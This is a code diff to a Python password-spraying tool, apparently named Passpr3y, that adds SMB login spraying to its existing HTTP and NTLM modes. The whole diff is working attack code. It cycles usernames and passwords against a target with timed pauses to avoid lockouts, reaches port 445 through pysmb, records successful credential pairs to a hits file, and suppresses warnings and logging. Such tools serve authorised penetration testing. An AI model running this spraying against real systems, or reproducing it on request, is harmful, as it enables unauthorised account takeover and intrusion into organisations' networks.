@@ -12,13 +12,17 @@ import argparse
 import collections
 import requests
 from requests_ntlm import HttpNtlmAuth
+from smb.SMBConnection import SMBConnection
+from nmb.NetBIOS import NetBIOS
 import os
 import sys
 import time
+import socket
 import hashlib
 import random
 import string
 import pprint
+import logging
 
 # INSTALL this package using "pip3 install git+https://github.com/phohenecker/stream-to-logger"
 # This helps redirect all print statements to a file for later examination
@@ -28,6 +32,10 @@ streamtologger.redirect(target="./passpr3y_output.txt")
 # Get rid of dem warnings, this a gottam hak tool
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+# Disable logging from pysmb
+logging.getLogger('SMB').setLevel(logging.CRITICAL)
+logging.getLogger('NMB').setLevel(logging.CRITICAL)
 
 # Console colors
 G = '\033[92m'  # green
@@ -43,7 +51,7 @@ if not os.access(PASSPR3Y_HITS_FILE, os.R_OK):
         os.utime(PASSPR3Y_HITS_FILE, None)
 
 class Passpr3y:
-    def __init__(self, requestFile, usernameFile, passwordFile, duration=7200, ssl=False, shotgun=False, proxy=None, ntlm=False):
+    def __init__(self, requestFile, usernameFile, passwordFile, duration=7200, ssl=False, shotgun=False, proxy=None, ntlm=False, smb=False, ip="127.0.0.1", domain="."):
 
         # Check python version
         if sys.version_info[0] < 3:
@@ -57,6 +65,9 @@ class Passpr3y:
         self.shotgun = shotgun
         self.proxy = { 'http' : proxy, 'https' : proxy}
         self.ntlm = ntlm
+        self.smb = smb
+        self.ip = ip
+        self.domain = domain
 
         # Create log directory
         if not os.path.exists("logs"):
@@ -107,29 +118,43 @@ class Passpr3y:
         if(not self.shotgun):
             if input("You will be spraying against " + str(len(self.usernameList)) + " users over the course of " + str(self.shotgunSleepTime) + " seconds.\nThere is a " + str(self.slowSleepTime) + " second wait between each user attempt.\nIs that cool? (y/N) ").lower() != 'y':
                 sys.exit("Change spray time.")
-
         else:
             if input("You've selected the shotgun method.\nThis will spray ALL users without pausing between each user.\nAfter spraying ALL users, there is a " + str(self.shotgunSleepTime) + " second wait. Opsec is questionable.\nIs that cool? (y/N) ").lower() != 'y':
                 sys.exit("Don't set shotgun flag.")
 
     def performTest(self):
-        randomUser = ''.join(random.choice(string.ascii_lowercase) for _ in range(12))
-        randomPass = ''.join(random.choice(string.ascii_lowercase) for _ in range(12))
-        print("%sPerforming test request to benchmark failed attempt...%s" % (Y,W))
+        if(not self.smb):
+            randomUser = ''.join(random.choice(string.ascii_lowercase) for _ in range(12))
+            randomPass = ''.join(random.choice(string.ascii_lowercase) for _ in range(12))
+            print("%sPerforming test request to benchmark failed attempt...%s" % (Y,W))
 
-        if(not self.ntlm):
-            self.test_response = self.performRequest(randomUser, randomPass)
+            if(not self.ntlm):
+                self.test_response = self.performRequest(randomUser, randomPass)
+            else:
+                self.test_response = self.performNTLMRequest(randomUser, randomPass)
+
+            self.test_hexDigest = self.getHashFromResponse(self.test_response)
+
+            if(self.test_response.status_code == 400):
+                print("%sTest request returned status code " % (R) + str(self.test_response.status_code) + "%s" % (W))
+                if(input("Are you sure you want to continue? (y/N) ") != 'y'):
+                    sys.exit("Unsatisfactory HTTP response code.")
+            else:
+                print("%sTest request did not return 400, moving on.%s\n" % (G,W))
         else:
-            self.test_response = self.performNTLMRequest(randomUser, randomPass)
-
-        self.test_hexDigest = self.getHashFromResponse(self.test_response)
-
-        if(self.test_response.status_code == 400):
-            print("%sTest request returned status code " % (R) + str(self.test_response.status_code) + "%s" % (W))
-            if(input("Are you sure you want to continue? (y/N) ") != 'y'):
-                sys.exit("Unsatisfactory HTTP response code.")
-        else:
-            print("%sTest request did not return 400, moving on.%s\n" % (G,W))
+            print("%sAttempting to reach machine for SMB login...%s" % (Y,W))
+            n = NetBIOS()
+            ip = n.queryIPForName(self.ip)
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            try:
+                s.connect((self.ip, 445))
+                s.shutdown(2)
+                print("%sMachine is available on port 445, moving on.%s\n" % (G,W))
+            except:
+                print("%sCan't reach machine on port 445" % (R) + str(self.test_response.status_code) + "%s" % (W))
+                if(input("Are you sure you want to continue? (y/N) ") != 'y'):
+                    sys.exit("Double check IP and port 445 open.")
+                return False
 
     def performSpray(self):
         # Spray
@@ -143,78 +168,90 @@ class Passpr3y:
 
             # Perform spray
             for idx, username in enumerate(self.usernameList, start=1):
-                if(self.ntlm):
-                    response = self.performNTLMRequest(username, password)
+                if(not self.smb):
+                    if(self.ntlm):
+                        response = self.performNTLMRequest(username, password)
+                    else:
+                        response = self.performRequest(username, password)
+
+                    hexDigest = self.getHashFromResponse(response)
+
+                    # Check if hash matches test response, if not, print request and response
+                    if(hexDigest != self.test_hexDigest):
+                        print("\t(" + str(idx) + "/" + str(len(self.usernameList)) + ') ' + "%s" % (G) + username + ':' + password + "%s" % (W) + " --- Anomalous response, check log file " + hexDigest)
+                        print(username + ":" + password, file=open(PASSPR3Y_HITS_FILE, "a"))
+                    else:
+                        print("\t(" + str(idx) + "/" + str(len(self.usernameList)) + ') ' + username + ':' + password)
+
+                    # Store hash of response. Chance of collision but very minimal.
+                    responseDict[hexDigest] = response
                 else:
-                    response = self.performRequest(username, password)
+                    response = self.performSMBRequest(self.domain, username, password, self.ip)
+                    
+                    if response:
+                        print("\t(" + str(idx) + "/" + str(len(self.usernameList)) + ') ' + "%s" % (G) + self.domain + '\\' + username + ':' + password + "%s" % (W) + " --- SMB login successful")
+                        print(username + ":" + password, file=open(PASSPR3Y_HITS_FILE, "a"))
+                    else:
+                        print("\t(" + str(idx) + "/" + str(len(self.usernameList)) + ') ' + self.domain + '\\' + username + ':' + password)
 
-                hexDigest = self.getHashFromResponse(response)
-
-                # Check if hash matches test response, if not, print request and response
-                if(hexDigest != self.test_hexDigest):
-                    print("\t(" + str(idx) + "/" + str(len(self.usernameList)) + ') ' + "%s" % (G) + username + ':' + password + "%s" % (W) + " --- Anomalous response, check log file " + hexDigest)
-                    print(username + ":" + password, file=open(PASSPR3Y_HITS_FILE, "a"))
-                else:
-                    print("\t(" + str(idx) + "/" + str(len(self.usernameList)) + ') ' + username + ':' + password)
-
-                # Store hash of response. Chance of collision but very minimal.
-                responseDict[hexDigest] = response
 
                 # Don't sleep after very last spray
                 if(not self.shotgun and (password != self.passwordList[-1] or username != self.usernameList[-1])):
                     time.sleep(self.slowSleepTime)
 
-            # Indicate number of unique responses (still basic approach)
-            print("\t\tUnique responses: " + str(len(responseDict)))
+            # Log requests only for web requests, since they can have different post-success responses
+            if not self.smb:
+                # Indicate number of unique responses
+                print("\t\tUnique responses: " + str(len(responseDict)))
 
-            # Create file
-            if not os.path.exists("logs/" + date):
-                os.makedirs("logs/" + date)
-            if not os.path.exists("logs/" + date + '/' + tyme):
-                os.makedirs("logs/" + date + '/' + tyme)
+                # Create file
+                if not os.path.exists("logs/" + date):
+                    os.makedirs("logs/" + date)
+                if not os.path.exists("logs/" + date + '/' + tyme):
+                    os.makedirs("logs/" + date + '/' + tyme)
 
-            # Write to file. Files are named with hashes that distinguish between unique responses.
-            for key,value in responseDict.items():
-                fileOut = open("logs/" + date + '/' + tyme + '/' + key + ".html", 'w')
+                # Write to file. Files are named with hashes that distinguish between unique responses.
+                for key,value in responseDict.items():
+                    fileOut = open("logs/" + date + '/' + tyme + '/' + key + ".html", 'w')
 
-                # Log request. If there were redirects, log the very first request made.
-                fileOut.write('-'*80 + '\n')
-                fileOut.write("REQUEST")
-                fileOut.write('\n' + '-'*80 + '\n')
+                    # Log request. If there were redirects, log the very first request made.
+                    fileOut.write('-'*80 + '\n')
+                    fileOut.write("REQUEST")
+                    fileOut.write('\n' + '-'*80 + '\n')
 
-                requestToLog = requests.Request()
-                if(value.history):
-                    requestToLog = value.history[0].request
-                else:
-                    requestToLog = value.request
+                    requestToLog = requests.Request()
+                    if(value.history):
+                        requestToLog = value.history[0].request
+                    else:
+                        requestToLog = value.request
 
-                fileOut.write(str(requestToLog.url) + '\n\n')
-                for k2,v2 in requestToLog.headers.items():
-                    fileOut.write(k2 + ": " + v2 + '\n')
-                fileOut.write('\n' + str(requestToLog.body) + '\n')
+                    fileOut.write(str(requestToLog.url) + '\n\n')
+                    for k2,v2 in requestToLog.headers.items():
+                        fileOut.write(k2 + ": " + v2 + '\n')
+                    fileOut.write('\n' + str(requestToLog.body) + '\n')
 
-                # Log response
-                if(value.history):
-                    for historyItem in value.history:
-                        fileOut.write('\n' + '-'*80 + '\n')
-                        fileOut.write("RESPONSE")
-                        fileOut.write('\n' + '-'*80 + '\n')
+                    # Log response
+                    if(value.history):
+                        for historyItem in value.history:
+                            fileOut.write('\n' + '-'*80 + '\n')
+                            fileOut.write("RESPONSE")
+                            fileOut.write('\n' + '-'*80 + '\n')
 
-                        fileOut.write(str(historyItem.status_code) + ' ' + historyItem.reason + '\n')
-                        for k2,v2 in historyItem.headers.items():
-                            fileOut.write(k2 + ": " + v2 + '\n')
-                        fileOut.write('\n' + historyItem.text)
+                            fileOut.write(str(historyItem.status_code) + ' ' + historyItem.reason + '\n')
+                            for k2,v2 in historyItem.headers.items():
+                                fileOut.write(k2 + ": " + v2 + '\n')
+                            fileOut.write('\n' + historyItem.text)
 
-                fileOut.write('\n' + '-'*80 + '\n')
-                fileOut.write("RESPONSE")
-                fileOut.write('\n' + '-'*80 + '\n')
+                    fileOut.write('\n' + '-'*80 + '\n')
+                    fileOut.write("RESPONSE")
+                    fileOut.write('\n' + '-'*80 + '\n')
 
-                fileOut.write(str(value.status_code) + ' ' + value.reason + '\n')
-                for k2,v2 in value.headers.items():
-                    fileOut.write(k2 + ": " + v2 + '\n')
-                fileOut.write('\n' + value.text)
+                    fileOut.write(str(value.status_code) + ' ' + value.reason + '\n')
+                    for k2,v2 in value.headers.items():
+                        fileOut.write(k2 + ": " + v2 + '\n')
+                    fileOut.write('\n' + value.text)
 
-                fileOut.close()
+                    fileOut.close()
 
             if(self.shotgun and password is not self.passwordList[-1]):
                 time.sleep(self.shotgunSleepTime)
@@ -231,7 +268,6 @@ class Passpr3y:
         self.dataDict[self.passwordKey] = password
         
         # Attempt login
-#        print("\tAttempting " + username + ':' + password)
         if(self.ssl):
             url = "https://" + self.headerDict["Host"] + self.endPoint
         else:
@@ -250,14 +286,19 @@ class Passpr3y:
         return s.send(prepped)
 
     def performNTLMRequest(self, username, password):
-        # Attempt NTLM login
-#        print("\t Attempting NTLM " + username + ':' + password)
         if(self.ssl):
             url = "https://" + self.headerDict["Host"] + '/'
         else:
             url = "http://" + self.headerDict["Host"] + '/'
         
         return requests.get(url, proxies=self.proxy, verify=False, auth=HttpNtlmAuth(username, password))
+
+    def performSMBRequest(self, domain, username, password, ip):
+        n = NetBIOS()
+        machineName = n.queryIPForName(ip)[0]
+        randomClientName = ''.join(random.choice(string.ascii_lowercase) for _ in range(12))
+        conn = SMBConnection(username, password, randomClientName, machineName, domain)
+        return conn.connect(ip)
 
 def pretty_print_POST(req):
     """
@@ -286,6 +327,9 @@ if __name__ == '__main__':
     parser.add_argument("--shotgun", action="store_true", help="Spray all users with no pause.")
     parser.add_argument("--proxy", help="Specify proxy. Format: 'http://127.0.0.1:8080'")
     parser.add_argument("--ntlm", action="store_true", help="Use NTLM.")
+    parser.add_argument("--smb", action="store_true", help="Login over SMB. Needs ip and domain options.")
+    parser.add_argument("--ip", help="Needed for SMB login spray.")
+    parser.add_argument("--domain", help="Needed for SMB login spray. Use '.' for local auth.")
 
     args = parser.parse_args()
 
@@ -312,7 +356,10 @@ if __name__ == '__main__':
             shotgun=args.shotgun, \
             ssl=args.ssl, \
             proxy=args.proxy, \
-            ntlm=args.ntlm)
+            ntlm=args.ntlm, \
+            smb=args.smb, \
+            ip=args.ip, \
+            domain=args.domain)
 
     pr3y.showWarning()
 
